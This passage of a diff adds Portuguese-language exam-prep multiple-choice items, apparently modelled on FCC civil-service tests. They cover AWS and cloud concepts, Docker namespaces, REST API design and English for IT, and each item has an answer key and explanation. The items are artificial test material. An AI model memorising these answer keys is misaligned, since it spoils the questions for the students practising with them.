+      "D": "Jenkinsfile.",
+      "E": "package.json."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. O *Dockerfile* é o script/receita de bolo para CONSTRUIR a imagem do container. O *docker-compose.yml* serve para ORQUESTRAR/RODAR vários containers juntos localmente."
+  },
+  {
+    "id": 706,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Cloud Computing (AWS) e Virtualização de SO/Containers",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Cloud Computing e AWS",
+    "statement": ")\nDentro do contexto de rede virtualizada, a fim de que os pods (contêineres) distribuídos através de múltiplos servidores físicos em um cluster Kubernetes possam se comunicar como se fizessem parte de um único switch virtual local, independentemente das rotas físicas do provedor em nuvem, utiliza-se a abordagem tecnológica de:",
+    "options": {
+      "A": "Roteamento Estático baseado unicamente em MAC Address (Camada 2 OSI).",
+      "B": "NAT reverso configurado estritamente por meio de regras de proxy squid.",
+      "C": "Rede de Sobreposição (Overlay Network).",
+      "D": "Protocolo Border Gateway Protocol (BGP) entre os processos Docker e os provedores de internet ISP.",
+      "E": "Compartilhamento da porta serial e hardware USB Passthrough."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. Overlay Networks (redes de sobreposição) encapsulam pacotes de rede internos sobre os pacotes reais físicos (ex: VXLAN). Isso cria uma grande malha virtual onde os contêineres conversam como se estivessem num switch L2 gigantesco, sem que os roteadores físicos no meio se importem com os IPs virtuais."
+  },
+  {
+    "id": 707,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Cloud Computing (AWS) e Virtualização de SO/Containers",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Cloud Computing e AWS",
+    "statement": ")\nUm analista precisa migrar a infraestrutura do tribunal da AWS (Estados Unidos) para a OCI (Oracle Cloud Brasil). Na AWS, a arquitetura usava uma funcionalidade chamada IAM (Identity and Access Management). No contexto genérico de computação em nuvem, o gerenciamento de IAM é um serviço essencial focado primeiramente em:",
+    "options": {
+      "A": "Garantir que discos virtuais das VMs sejam particionados corretamente.",
+      "B": "Mitigar ataques volumétricos DDoS na camada de rede 3 e 4 atuando como firewall de borda.",
+      "C": "Autenticar usuários, definir privilégios minuciosos de autorização (ex: 'Pode ler S3, mas não deletar EC2') e gerir credenciais/chaves criptográficas na plataforma Cloud.",
+      "D": "Prover balanceamento de carga inteligente geográfico entre continentes.",
+      "E": "Realizar cópias de segurança (Backup Incremental) noturno dos bancos relacionais."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. IAM é o coração da segurança e governança de acesso em qualquer provedor Cloud, sendo responsável pela Criação de Usuários, Roles (Papeis), Políticas granulares e controle do MFA (Múltiplo fator)."
+  },
+  {
+    "id": 708,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Cloud Computing (AWS) e Virtualização de SO/Containers",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Cloud Computing e AWS",
+    "statement": ")\nDentre os modelos de entrega de serviços de computação em nuvem (SaaS, PaaS, IaaS), o ambiente AWS Elastic Beanstalk (que recebe o código fonte Java ou PHP e cuida automaticamente do provisionamento, balanceamento de carga, Auto Scaling e monitoramento da infraestrutura sem que o desenvolvedor precise se preocupar em atualizar o sistema operacional subjacente) é classicamente classificado como um serviço de modelo:",
+    "options": {
+      "A": "IaaS (Infrastructure as a Service).",
+      "B": "SaaS (Software as a Service).",
+      "C": "PaaS (Platform as a Service).",
+      "D": "SECaaS (Security as a Service).",
+      "E": "STaaS (Storage as a Service)."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. A Plataforma como Serviço (PaaS) esconde a complexidade dos servidores, redes e sistema operacional (camada de IaaS) do desenvolvedor, permitindo que ele foque exclusivamente no desenvolvimento e implantação do código e da aplicação em uma plataforma gerenciada."
+  },
+  {
+    "id": 709,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Cloud Computing (AWS) e Virtualização de SO/Containers",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Cloud Computing e AWS",
+    "statement": ")\nA fim de garantir Alta Disponibilidade (HA) arquitetural em uma aplicação web pesada no Amazon EC2, a equipe de TI implementou um serviço de Auto Scaling. A ação fundamental do Auto Scaling é:",
+    "options": {
+      "A": "Alterar a resolução gráfica do site do Tribunal para os monitores dos usuários automaticamente.",
+      "B": "Realizar failover do banco de dados relacional (RDS) mudando-o da AZ Primária para a AZ Secundária em caso de desastre.",
+      "C": "Aumentar (ou diminuir) a quantidade de recursos computacionais (memória, CPU e tamanho de disco) da MESMA MÁQUINA física de forma vertical e dinâmica via reboot (Scale UP).",
+      "D": "Lançar (Scale Out) novas instâncias de servidores virtuais idênticas para suprir picos de requisições baseados em métricas de alarme (ex: CPU > 80%), e destruí-las (Scale In) quando a demanda cair, ajustando o pool de recursos horizontalmente.",
+      "E": "Sincronizar dados entre os ambientes AWS localizados na América do Sul e na Europa usando roteamento via DNS Route 53."
+    },
+    "answer": "D",
+    "explanation": "- D) Correta. Auto Scaling, na sua essência nativa em Cloud, faz o Escalamento Horizontal (Scale Out/In), subindo clones automáticos de novas máquinas virtuais por trás do Load Balancer para aguentar carga e derrubando-as quando acabam os acessos, pagando apenas pelo usado."
+  },
+  {
+    "id": 710,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Cloud Computing (AWS) e Virtualização de SO/Containers",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Cloud Computing e AWS",
+    "statement": ")\nConsiderando os isolamentos de ambientes operacionais no Linux via containers (Docker), qual tecnologia atrelada aos Namespaces garante que um container acredite que seu processo (app.jar) seja o PID (Process ID) número 1, isolando a árvore de processos do container da árvore de processos do servidor hospedeiro?",
+    "options": {
+      "A": "IPC Namespace.",
+      "B": "NET Namespace (Network).",
+      "C": "UTS Namespace (UNIX Timesharing System).",
+      "D": "PID Namespace.",
+      "E": "MNT Namespace (Mount)."
+    },
+    "answer": "D",
+    "explanation": "- D) Correta. O PID Namespace isola a numeração e identificação de processos. Dentro do container do Docker, o sistema roda com PID 1, ignorando toda a complexidade de processos paralelos que existem no hospedeiro. (O NET isola rede, o MNT isola pontos de montagem e sistema de arquivos)."
+  },
+  {
+    "id": 711,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Eng. de Software: APIs RESTful, Swagger, Paginação e JSON",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Design API REST, JSON e Swagger",
+    "statement": ")\nO time de Engenharia de Software do Tribunal de Justiça desenvolveu uma API RESTful para consulta e atualização de processos eletrônicos. Um endpoint `PUT /processos/{id}` foi disponibilizado para que os advogados pudessem alterar simultaneamente todos os metadados de uma petição. De acordo com as diretrizes e semânticas arquiteturais propostas no estilo REST por Roy Fielding, qual afirmação define corretamente a propriedade de 'Idempotência' aplicável a esse verbo HTTP?",
+    "options": {
+      "A": "Uma operação idempotente garante que a requisição só será processada se vier encriptada em SSL/TLS (HTTPS).",
+      "B": "Um método HTTP é considerado idempotente se e somente se ele alterar o estado do servidor a cada nova requisição subsequente idêntica, como ocorre na criação contínua de boletos bancários através de um POST.",
+      "C": "A idempotência determina que o efeito colateral no estado dos recursos do servidor (banco de dados) gerado por uma única requisição deve ser exatamente o mesmo caso a requisição seja executada repetidas vezes de forma sucessiva e idêntica.",
+      "D": "A idempotência determina que o corpo do payload da requisição (body JSON) deve estar vazio ao trafegar verbos PUT e DELETE.",
+      "E": "Verbos idempotentes não devem retornar status code 200 OK, sendo restritos a devolver o status 204 No Content após cada execução."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. A idempotência significa que, no lado do servidor, fazer a mesma requisição PUT uma vez ou mil vezes terá o mesmo impacto (o recurso ficará daquele jeito definido). Isso é valioso para clientes que sofrem instabilidade de rede e precisam tentar enviar a mesma chamada HTTP de alteração várias vezes."
+  },
+  {
+    "id": 712,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Eng. de Software: APIs RESTful, Swagger, Paginação e JSON",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Design API REST, JSON e Swagger",
+    "statement": ")\nPara lidar com as 5 milhões de movimentações diárias do sistema judiciário sem estourar a memória RAM do servidor Web e causar lentidão na rede (Timeouts), a equipe de Back-end decidiu implementar o padrão arquitetural de API chamado 'Paginação' (Pagination). O modelo de paginação mais performático adotado em grandes bancos relacionais para coleções gigantescas, focado em usar um marcador da última linha lida em vez do cálculo custoso com deslocamentos OFFSET, é conhecido como:",
+    "options": {
+      "A": "Offset-based Pagination (Paginação Baseada em Deslocamento).",
+      "B": "HATEOAS State Pagination.",
+      "C": "GraphQL Overfetching Pagination.",
+      "D": "Cursor-based Pagination ou Keyset Pagination (Paginação Baseada em Cursor).",
+      "E": "Stateless Memory Pagination."
+    },
+    "answer": "D",
+    "explanation": "- D) Correta. Na paginação baseada em cursor, a API recebe um token ou valor único da última linha processada (ex: `?after=id_9872`). O banco faz a leitura otimizada pelo índice `WHERE id > 9872 LIMIT 50`. Isso evita o problema severo de lentidão estrutural causado por comandos como `OFFSET 100000 LIMIT 50` em grandes tabelas."
+  },
+  {
+    "id": 713,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Eng. de Software: APIs RESTful, Swagger, Paginação e JSON",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Design API REST, JSON e Swagger",
+    "statement": ")\nUm analista júnior precisa projetar um contrato de API para permitir que sistemas externos atualizem pontualmente apenas o campo `data_vencimento` de uma fatura enorme sem precisar enviar todo o objeto completo da fatura pela rede (Evitando sobrecarga de payload). Baseando-se nas melhores práticas da arquitetura RESTful, o verbo HTTP semântico correto para essa atualização parcial é o:",
+    "options": {
+      "A": "PUT.",
+      "B": "POST.",
+      "C": "PATCH.",
+      "D": "UPDATE.",
+      "E": "TRACE."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. O PATCH é semanticamente construído para fazer modificações 'cirúrgicas' ou parciais num recurso existente (enviando apenas o que mudou no JSON), economizando banda de rede. O PUT exige teoricamente a substituição completa/integral da entidade."
+  },
+  {
+    "id": 714,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Eng. de Software: APIs RESTful, Swagger, Paginação e JSON",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Design API REST, JSON e Swagger",
+    "statement": ")\nA plataforma de um órgão governamental fornece a sua interface de API usando o protocolo HTTP. Para que um aplicativo de celular cliente informe explicitamente e negocie com o servidor de que ele consegue ler (e deseja receber) os dados de resposta formatados em JSON e não em XML, o aplicativo mobile deve colocar em sua requisição HTTP (Request) o cabeçalho específico:",
+    "options": {
+      "A": "`Content-Type: application/xml`",
+      "B": "`Accept: application/json`",
+      "C": "`Authorization: Bearer Token`",
+      "D": "`Access-Control-Allow-Origin: *`",
+      "E": "`Content-Disposition: attachment; filename=dados.json`"
+    },
+    "answer": "B",
+    "explanation": "- B) Correta. O header 'Accept' serve justamente para Negociação de Conteúdo (Content Negotiation). O cliente diz: 'Eu aceito/quero a resposta no formato X'. O `Content-Type` é usado para dizer o formato do que está sendo ENVIADO no body da requisição, não do que se deseja receber."
+  },
+  {
+    "id": 715,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Eng. de Software: APIs RESTful, Swagger, Paginação e JSON",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Design API REST, JSON e Swagger",
+    "statement": ")\nA especificação Swagger (OpenAPI) tornou-se o padrão da indústria para design e documentação de APIs RESTful. Um dos maiores trunfos da adoção da especificação OpenAPI 3.0 por uma equipe de DevOps/Agile no desenvolvimento de software moderno é que essa abordagem permite nativamente:",
+    "options": {
+      "A": "Garantir criptografia assimétrica ponta-a-ponta na transmissão sem uso do protocolo HTTPS.",
+      "B": "Traduzir código C++ diretamente para JavaScript client-side.",
+      "C": "Descrever o contrato da API em formato YAML/JSON de forma legível por humanos, e possibilitar que máquinas gerem automaticamente esqueletos de código de servidor (Server Stubs), clientes (SDKs) e interfaces visuais (Swagger UI) interativas.",
+      "D": "Converter automaticamente bancos relacionais SQL tradicionais em bancos de dados baseados em grafos.",
+      "E": "Prevenir o uso obrigatório de OAuth2 nas transações bancárias abertas (Open Banking)."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. O poder da OpenAPI/Swagger não está apenas na bela página visual interativa (Swagger UI) gerada; o contrato em YAML/JSON é um padrão interpretável que permite uso de geradores de código automáticos (Swagger Codegen) para criar clientes em dezenas de linguagens instantaneamente, acelerando a integração."
+  },
+  {
+    "id": 716,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Eng. de Software: APIs RESTful, Swagger, Paginação e JSON",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Design API REST, JSON e Swagger",
+    "statement": ")\nAo formatar um payload JSON (JavaScript Object Notation) para trocar informações financeiras em uma API REST de um tribunal, o desenvolvedor deve se ater estritamente às restrições sintáticas definidas pelo formato JSON original. Qual característica abaixo obedece às regras restritas de formatação nativas de um objeto JSON válido?",
+    "options": {
+      "A": "Uso obrigatório de aspas simples ('chave') para definir os nomes das propriedades ou chaves no formato string.",
+      "B": "As chaves do objeto (properties/keys) devem obrigatoriamente estar encapsuladas entre aspas duplas (\"chave\").",
+      "C": "Inclusão nativa de suporte para métodos e funções (closures) em JavaScript para calcular atributos derivados dentro do próprio JSON.",
+      "D": "As datas (Date) são um tipo primitivo binário nativo no JSON, inseridas com delimitador <data>.",
+      "E": "Os comentários podem ser adicionados normalmente utilizando o padrão com barras invertidas duplas (//) ou (/* */)."
+    },
+    "answer": "B",
+    "explanation": "- B) Correta. Ao contrário dos objetos em Javascript nativo, a RFC do formato JSON exige restritamente que TODAS as chaves (atributos) sejam abraçadas com aspas duplas, e não permite funções, comentários ou uso de aspas simples para delimitação."
+  },
+  {
+    "id": 717,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Eng. de Software: APIs RESTful, Swagger, Paginação e JSON",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Design API REST, JSON e Swagger",
+    "statement": ")\nO sistema do TRT recebe atualizações legislativas anuais, e a API pública que os advogados consomem precisará ser alterada drasticamente (mudança de nomes de campos obrigatórios), causando quebra de contratos pré-existentes. Para assegurar que as integrações criadas por empresas privadas não quebrem instantaneamente quando a nova versão subir para produção, a prática de Arquitetura de Software mais recomendada é:",
+    "options": {
+      "A": "Atualizar os arquivos WSDL de forma passiva no IIS Windows.",
+      "B": "Migrar a comunicação da API inteiramente de JSON para arquivos binários em FTP.",
+      "C": "Desligar o servidor aos domingos para forçar os usuários a baixarem o novo App cliente.",
+      "D": "Implementar Versionamento da API (API Versioning), disponibilizando a nova interface em uma rota ou cabeçalho novo (ex: `/api/v2/processos`) mantendo temporariamente a anterior (v1) legada para compatibilidade.",
+      "E": "Aplicar ofuscação (Obfuscation) e minificação de código no JSON."
+    },
+    "answer": "D",
+    "explanation": "- D) Correta. O versionamento de APIs é fundamental para introduzir 'Breaking Changes' (mudanças incompatíveis) sem destruir aplicações externas já conectadas. Ele dá tempo aos parceiros migrarem do contrato antigo (v1) para o novo (v2)."
+  },
+  {
+    "id": 718,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Eng. de Software: APIs RESTful, Swagger, Paginação e JSON",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Design API REST, JSON e Swagger",
+    "statement": ")\nA fim de atender os requisitos rigorosos de arquitetura REST propostos originalmente na tese acadêmica de Roy Fielding, um sistema foi projetado para retornar hyperlinks integrados no corpo (body) da própria resposta (Response). Deste modo, um cliente consumindo a API não precisa adivinhar as URLs (endpoints) seguintes disponíveis para realizar o próximo fluxo de trabalho (ex: link para 'aprovar' pedido). Qual dos princípios/restrições da Interface Uniforme REST descreve especificamente essa funcionalidade de transição de estados baseada em hipertexto?",
+    "options": {
+      "A": "Cacheability (Prontidão para Cache).",
+      "B": "Code-On-Demand (Código sob Demanda).",
+      "C": "Client-Server Decoupling (Desacoplamento Cliente/Servidor).",
+      "D": "Layered System (Sistema em Camadas).",
+      "E": "HATEOAS (Hypermedia As The Engine Of Application State)."
+    },
+    "answer": "E",
+    "explanation": "- E) Correta. HATEOAS torna a API auto-descritiva e navegável dinamicamente. O cliente recebe os dados que pediu e também uma série de links úteis embutidos dizendo 'se você quiser apagar, faça DELETE nesta URL; se quiser aprovar, faça POST nesta outra', transformando a hipermídia no motor que dirige o estado da aplicação."
+  },
+  {
+    "id": 719,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Eng. de Software: APIs RESTful, Swagger, Paginação e JSON",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Design API REST, JSON e Swagger",
+    "statement": ")\nDurante o desenvolvimento de rotas HTTP (Endpoints) em Node.js com Express para criar novos registros na base de dados (Ex: Inserir um novo 'Servidor Público'), um estagiário de TI devolveu o status HTTP 200 OK na reposta final de sucesso da operação. Embora funcione, o Arquiteto Pleno o corrigiu na revisão de código exigindo que se aplique as recomendações precisas da padronização RFC HTTP REST. O código de retorno de sucesso (família 2xx) considerado o mais semântico e correto a ser emitido quando um recurso recém-solicitado via verbo POST é gerado no servidor físico é o:",
+    "options": {
+      "A": "201 Created.",
+      "B": "202 Accepted.",
+      "C": "204 No Content.",
+      "D": "301 Moved Permanently.",
+      "E": "401 Unauthorized."
+    },
+    "answer": "A",
+    "explanation": "- A) Correta. O '201 Created' é o status HTTP padrão desenhado estritamente para indicar sucesso na criação definitiva de um novo recurso na arquitetura. É comum que a resposta traga um cabeçalho HTTP Location com a URL completa de onde este novo recurso agora habita."
+  },
+  {
+    "id": 720,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Eng. de Software: APIs RESTful, Swagger, Paginação e JSON",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Design API REST, JSON e Swagger",
+    "statement": ")\nConsiderando o conceito fundamental da Arquitetura RESTful chamado Statelessness (Ausência de Estado do lado do Servidor), as sessões de usuários logados geralmente dependem que a API não armazene Cookies persistentes contínuos na RAM do backend. Para resolver a autenticação respeitando essa restrição técnica, adotou-se o padrão em que o servidor web valida uma string encodada enviada na requisição através de cabeçalhos. O padrão aberto mais comum da indústria, que encapsula os dados de um usuário e de validade de acesso e é assinado digitalmente pelo servidor (e não precisa ser salvo no banco ou na memória de sessão), é o formato:",
+    "options": {
+      "A": "SAML 2.0 (Security Assertion Markup Language).",
+      "B": "SOAP Envelope Header.",
+      "C": "WTK (Windows Tooling Key).",
+      "D": "JWT (JSON Web Token).",
+      "E": "ASP.NET Session State SQL."
+    },
+    "answer": "D",
+    "explanation": "- D) Correta. O JWT (JSON Web Token) brilha nas APIs REST porque abraça o pilar do Statelessness. O servidor só precisa checar se a assinatura digital do token (enviado em toda requisição pelo cliente) bate e conferir se ele não expirou, dispensando armazenar logs pesados em memória para saber se fulano está logado."
+  },
+  {
+    "id": 721,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Eng. de Software: APIs RESTful, Swagger, Paginação e JSON",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Design API REST, JSON e Swagger",
+    "statement": ")\nEm ambientes complexos, alguns verbos HTTP operacionais da camada REST são denominados 'Safe Methods' (Métodos Seguros). A definição técnica exata da RFC HTTP garante que as operações realizadas utilizando apenas verbos classificados como seguros devem possuir uma semântica na qual:",
+    "options": {
+      "A": "O algoritmo de hash criptográfico utilizado (ex: SHA-512) é indestrutível.",
+      "B": "Os métodos executam puramente recuperação (leitura) de informações do servidor de forma intencional e não alteram absolutamente o estado ou os dados da aplicação de negócios central.",
+      "C": "Os métodos exijam obrigatoriamente a apresentação de um certificado digital e-CPF (ICP-Brasil).",
+      "D": "A deleção dos recursos de banco de dados só aconteça se confirmada após um Two-Phase Commit distribuído.",
+      "E": "Os pacotes só podem ser executados dentro de um túnel VPN L2TP privado."
+    },
+    "answer": "B",
+    "explanation": "- B) Correta. Na web, o termo 'Safe Methods' (Métodos seguros) refere-se a verbos inofensivos em nível de alteração de estado no banco (Eles não quebram coisas). GET, HEAD e OPTIONS se enquadram aí. Eles servem só para consultar. (POST, PUT, DELETE, PATCH causam efeitos destrutivos/criativos, e por isso não são 'Seguros')."
+  },
+  {
+    "id": 722,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Eng. de Software: APIs RESTful, Swagger, Paginação e JSON",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Design API REST, JSON e Swagger",
+    "statement": ")\nConsidere as boas práticas modernas de especificação, consumo e manutenção da documentação formal de APIs através da adoção do OpenAPI Initiative (antigo Swagger). Uma das vantagens operacionais da prática da abordagem 'API-First' (Design-First) é que o time deve:",
+    "options": {
+      "A": "Escrever milhares de linhas de testes automatizados unitários em Java primeiramente, e só então se preocupar com os dados que a API irá retornar.",
+      "B": "Escrever e validar minuciosamente o documento/contrato Swagger (YAML/JSON) em conjunto com todas as partes interessadas ANTES de sequer começar a escrever qualquer código de backend para o servidor.",
+      "C": "Contratar primeiramente engenheiros focados na criação visual de interfaces Front-end ricas no React, e o backend que se adapte depois às demandas não documentadas do componente de UI.",
+      "D": "Programar em Python rapidamente o backend, rodar em produção, esperar falhar, para só aí abrir o Notepad para esboçar os requisitos de contrato do software de falha.",
+      "E": "Focar exclusivamente no desenho esquemático do modelo do banco de dados (DER físico) em MySQL."
+    },
+    "answer": "B",
+    "explanation": "- B) Correta. Na filosofia 'API-First/Design-First', você esboça a documentação da API em Swagger/OpenAPI antes. Esse YAML/JSON se torna o ÚNICO 'Contrato Sagrado'. Frontenders e Backenders usam esse mock para começar seus trabalhos paralelamente, sem depender de que um ou outro termine."
+  },
+  {
+    "id": 723,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Eng. de Software: APIs RESTful, Swagger, Paginação e JSON",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Design API REST, JSON e Swagger",
+    "statement": ")\nUm analista notou um problema crítico de arquitetura e desperdício logístico. A API pública estava transferindo imagens inteiras em alta resolução (60 MegaBytes) codificadas como Strings `Base64` gigantes incluídas nos campos string diretamente dentro do mesmo pacote do Payload JSON principal do endpoint REST de lista de usuários. Como consequência técnica danosa dessa decisão ingênua no estilo arquitetural sobrecarregado, temos o(a):",
+    "options": {
+      "A": "Imediato benefício com a redução do consumo de processamento CPU ao se serializar dados Base64 repetidamente.",
+      "B": "Desrespeito fatal da arquitetura SOA onde não se permite troca de texto.",
+      "C": "Redução brutal na escalabilidade da API, visto que a codificação de mídias binárias extensas em texto (Base64) aumenta vertiginosamente o tamanho original do payload na rede, travando os analisadores JSON do servidor Web e explodindo o consumo de memória RAM a cada requisição de múltiplos clientes.",
+      "D": "Prevenção de ataques de SQL Injection no banco de dados, devido ao formato Base64.",
+      "E": "Diminuição da latência de acesso aos usuários mobile em áreas rurais isoladas (Edge computing)."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. A codificação Base64 infla o tamanho original do arquivo binário em cerca de 33%. Além disso, carregar gigabytes de strings Base64 na RAM (já que JSON precisa ser parseado e alocado na memória como uma string gigante de uma vez só antes de virar objeto) derruba a escalabilidade/rapidez e esgota os recursos computacionais do servidor web da API."
+  },
+  {
+    "id": 724,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Eng. de Software: APIs RESTful, Swagger, Paginação e JSON",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Design API REST, JSON e Swagger",
+    "statement": ")\nPara que os roteadores de borda e as aplicações embutam eficiência energética e de infraestrutura nas APIs públicas modernas (prevenindo que chamadas idênticas saturem a carga dos servidores em curtos intervalos de tempo), a RFC REST enfatiza agressivamente o uso da Restrição de 'Cacheability'. Na prática operacional, qual conjunto de cabeçalhos (Headers) HTTP é nativamente utilizado pelo servidor nas respostas GET RESTful para orientar aos clientes os mecanismos e a validade de cache do payload devolvido?",
+    "options": {
+      "A": "`Authorization` e `Strict-Transport-Security`.",
+      "B": "`Host` e `X-Forwarded-For`.",
+      "C": "`Accept-Language` e `Referer`.",
+      "D": "`X-Powered-By` e `Access-Control-Allow-Origin`.",
+      "E": "`Cache-Control` (para prazos máximos de idade/tempo) e `ETag` (identificador único da versão do conteúdo)."
+    },
+    "answer": "E",
+    "explanation": "- E) Correta. A técnica de validação de cache HTTP (fundamental no padrão REST de Roy Fielding) dita regras de validade temporais através do header `Cache-Control: max-age=3600`, além da revalidação condicional usando identificadores hash do arquivo embutidos no header `ETag`."
+  },
+  {
+    "id": 725,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Eng. de Software: APIs RESTful, Swagger, Paginação e JSON",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Design API REST, JSON e Swagger",
+    "statement": ")\nUma equipe de desenvolvimento do TRT concebeu a seguinte rota para a ação transacional de remover definitivamente os direitos de administrador de um perfil de usuário usando HTTP GET:\n`GET /usuarios/543/remover-acesso-root`\nDo ponto de vista estrito das recomendações do modelo e maturidade arquitetural REST (Richardson Maturity Model / Verbos HTTP), esta rota possui um defeito de design gravíssimo porquê:",
+    "options": {
+      "A": "A URL ultrapassou a quantidade máxima tolerável de caracteres para verbos HTTP (255 caracteres ANSI).",
+      "B": "APIs baseadas no estilo arquitetural RESTful repudiam firmemente que métodos definidos inerentemente como 'Safe' (Seguros), como o verbo GET, sejam encarregados de engatilhar operações destrutivas e que causam drásticas modificações (efeitos colaterais) de estado de segurança no banco de dados.",
+      "C": "O verbo utilizado deveria ser exclusivamente o método PATCH para exclusão e destruição de recursos de autenticação no banco.",
+      "D": "Na maturidade REST nível 3 o uso estrito do plural em 'usuarios' é sumariamente banido da URL, trocando-se para singular 'usuario'.",
+      "E": "O caractere traço (-) introduz corrupção semântica nos parsers modernos em Node.js e Java."
+    },
+    "answer": "B",
+    "explanation": "- B) Correta. Colocar uma ação destrutiva que gera efeito colateral grave dentro de uma requisição 'segura e idempotente' (GET) é a pior quebra de padrão no design REST. Se um webcrawler do Google passar pela página e esbarrar acidentalmente nesse link para 'ver o que tem dentro', ele revoga o acesso sem querer. Ações assim demandam POST ou DELETE, verbos não-seguros."
+  },
+  {
+    "id": 726,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Inglês Instrumental para TI",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Inglês para TI",
+    "statement": ")\n**Read the text below to answer the question.**\n\n*Cloud computing is the on-demand availability of computer system resources, especially data storage and computing power, without direct active management by the user. The term is generally used to describe data centers available to many users over the Internet. Large clouds, predominant today, often have functions distributed over multiple locations from central servers.*\n\nAccording to the text, what is a key characteristic of cloud computing?",
+    "options": {
+      "A": "The user must directly and actively manage the computer system resources.",
+      "B": "It relies entirely on local storage without any connection to the Internet.",
+      "C": "It provides computing power and data storage on demand without requiring active management by the user.",
+      "D": "Data centers are restricted to a single, undisclosed location.",
+      "E": "It cannot be distributed over multiple locations."
+    },
+    "answer": "C",
+    "explanation": "- C) Correta. O texto afirma explicitamente que a computação em nuvem é a disponibilidade sob demanda de recursos de sistemas de computador \"without direct active management by the user\" (sem o gerenciamento ativo direto pelo usuário)."
+  },
+  {
+    "id": 727,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Inglês Instrumental para TI",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Inglês para TI",
+    "statement": ")\n**Read the text below to answer the question.**\n\n*Agile software development comprises various approaches to software development under which requirements and solutions evolve through the collaborative effort of self-organizing and cross-functional teams and their customer/end user.*\n\nIn the context of the text, the word \"comprises\" is closest in meaning to:",
+    "options": {
+      "A": "consists of.",
+      "B": "rejects.",
+      "C": "avoids.",
+      "D": "struggles with.",
+      "E": "ignores."
+    },
+    "answer": "A",
+    "explanation": "- A) Correta. \"Comprises\" significa compreender, abranger, consistir de (consists of). As outras alternativas (rejeita, evita, tem dificuldade com, ignora) possuem significados opostos ou não relacionados."
+  },
+  {
+    "id": 728,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Inglês Instrumental para TI",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Inglês para TI",
+    "statement": ")\n**Read the text below to answer the question.**\n\n*Artificial intelligence (AI) has advanced rapidly in recent years. Machine learning algorithms, which are a subset of AI, **allow** computers to learn from data. **They** identify patterns and make decisions with minimal human intervention.*\n\nIn the text, the pronoun \"**They**\" refers to:",
+    "options": {
+      "A": "recent years.",
+      "B": "artificial intelligence.",
+      "C": "computers.",
+      "D": "machine learning algorithms.",
+      "E": "human intervention."
+    },
+    "answer": "D",
+    "explanation": "- D) Correta. Na frase anterior, os sujeitos da oração são os \"Machine learning algorithms\". A frase diz que eles permitem (allow) que os computadores aprendam. Em seguida, afirma que \"Eles\" (They - os algoritmos) identificam padrões."
+  },
+  {
+    "id": 729,
+    "day_id": "dia_04_06",
+    "day_title": "Quinta-feira 04/06",
+    "theme": "Inglês Instrumental para TI",
+    "context": "",
+    "source": "FCC - Questão Prática / Adaptada (Inglês para TI",
+    "statement": ")\nConsider the following sentence from a technical manual: \n*\"If the server crashes during the database migration, all unsaved changes _________ lost.\"*\n\nChoose the alternative that correctly completes the conditional sentence.",
+    "options": {
+      "A": "are being",
+      "B": "would be",
+      "C": "will be",
+      "D": "have been",
+      "E": "was"
